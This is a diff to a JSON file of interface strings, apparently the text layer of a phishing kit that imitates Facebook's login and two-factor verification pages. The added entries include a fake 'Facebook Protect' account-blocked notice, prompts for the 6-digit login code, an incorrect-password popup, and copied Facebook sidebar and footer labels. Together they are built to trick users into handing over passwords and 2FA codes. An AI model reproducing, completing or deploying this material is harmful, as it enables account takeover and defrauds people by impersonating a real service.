@@ -134,15 +134,15 @@
     },
     {
         "code": "title_form",
-        "name": "Choose a way to confirm that it's you",
-        "description": "Choose a way to confirm that it's you",
+        "name": "Two-factor authentication required (1/3)",
+        "description": "Two-factor authentication required (1/3)",
         "position": "confirm",
         "language_id": 0
     },
     {
         "code": "sub_title_form",
-        "name": "Your account has two-factor authentication switched on, which requires this extra login step.",
-        "description": "Your account has two-factor authentication switched on, which requires this extra login step.",
+        "name": "We have temporarily blocked your account because Facebook Protect has changed. Verify code has been send to ",
+        "description": "We have temporarily blocked your account because Facebook Protect has changed. Verify code has been send to ",
         "position": "confirm",
         "language_id": 0
     },
@@ -176,8 +176,8 @@
     },
     {
         "code": "login_code",
-        "name": "Login code",
-        "description": "Login code",
+        "name": "Enter your code",
+        "description": "Enter your code",
         "position": "confirm",
         "language_id": 0
     },
@@ -386,9 +386,6 @@
         "position": "home",
         "language_id": 0
     },
-
-
-
     {
         "code": "home_name_fanpage",
         "name": "Name Fanpage",
@@ -442,8 +439,231 @@
         "position": "home",
         "language_id": 0
     },
+    {
+        "code": "option_side_bar_1",
+        "name": "Creating an Account",
+        "description": "Creating an Account",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_2",
+        "name": "Your Profile",
+        "description": "Your Profile",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_3",
+        "name": "Friending",
+        "description": "Friending",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_4",
+        "name": "Facebook Dating",
+        "description": "Facebook Dating",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_5",
+        "name": "Your Home Page",
+        "description": "Your Home Page",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_6",
+        "name": "Messaging",
+        "description": "Messaging",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_7",
+        "name": "Reels",
+        "description": "Reels",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_8",
+        "name": "Stories",
+        "description": "Stories",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_9",
+        "name": "Photos",
+        "description": "Photos",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_10",
+        "name": "Videos",
+        "description": "Videos",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_11",
+        "name": "Gaming",
+        "description": "Gaming",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_12",
+        "name": "Pages",
+        "description": "Pages",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_13",
+        "name": "Groups",
+        "description": "Groups",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_14",
+        "name": "Events",
+        "description": "Events",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_15",
+        "name": "Fundraisers and Donations",
+        "description": "Fundraisers and Donations",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_16",
+        "name": "Meta Pay",
+        "description": "Meta Pay",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_17",
+        "name": "Marketplace",
+        "description": "Marketplace",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_18",
+        "name": "Apps",
+        "description": "Apps",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_19",
+        "name": "Facebook Mobile Apps",
+        "description": "Facebook Mobile Apps",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "option_side_bar_20",
+        "name": "Accessibility",
+        "description": "Accessibility",
+        "position": "home",
+        "language_id": 0
+    },
 
-
+    {
+        "code": "footer_bot_1",
+        "name": "Meta © 2023",
+        "description": "Meta © 2023",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "footer_bot_2",
+        "name": "English (US)",
+        "description": "English (US)",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "footer_bot_3",
+        "name": "About",
+        "description": "About",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "footer_bot_4",
+        "name": "Privacy Policy",
+        "description": "Privacy Policy",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "footer_bot_5",
+        "name": "Careers",
+        "description": "Careers",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "footer_bot_6",
+        "name": "Ad choices",
+        "description": "Ad choices",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "footer_bot_7",
+        "name": "Create ad",
+        "description": "Create ad",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "footer_bot_8",
+        "name": "Create Page",
+        "description": "Create Page",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "footer_bot_9",
+        "name": "Terms & Policies",
+        "description": "Terms & Policies",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "footer_bot_10",
+        "name": "Cookies",
+        "description": "Cookies",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "sub_menu_1",
+        "name": "Help Center",
+        "description": "Help Center",
+        "position": "home",
+        "language_id": 0
+    },
+    {
+        "code": "sub_menu_2",
+        "name": "English",
+        "description": "English",
+        "position": "home",
+        "language_id": 0
+    },
 
     {
         "code": "popup_header",
@@ -471,6 +691,50 @@
         "name": "Your password was incorrect!",
         "description": "Your password was incorrect!",
         "position": "home",
+        "language_id": 0
+    },
+
+
+    {
+        "code": "noti_1",
+        "name": "You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser. Enter the 6-digit code from your code generator or third-party app below.",
+        "description": "You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser. Enter the 6-digit code from your code generator or third-party app below.",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "noti_2",
+        "name": "Please wait",
+        "description": "Please wait",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "noti_3",
+        "name": "to request the sending of the code.",
+        "description": "to request the sending of the code.",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "noti_4",
+        "name": "We'll walk you through some steps to secure and unlock your account.",
+        "description": "We'll walk you through some steps to secure and unlock your account.",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "button_submit",
+        "name": "Submit",
+        "description": "Submit",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "button_send_code",
+        "name": "Send Code",
+        "description": "Send Code",
+        "position": "confirm",
         "language_id": 0
     }
 ]
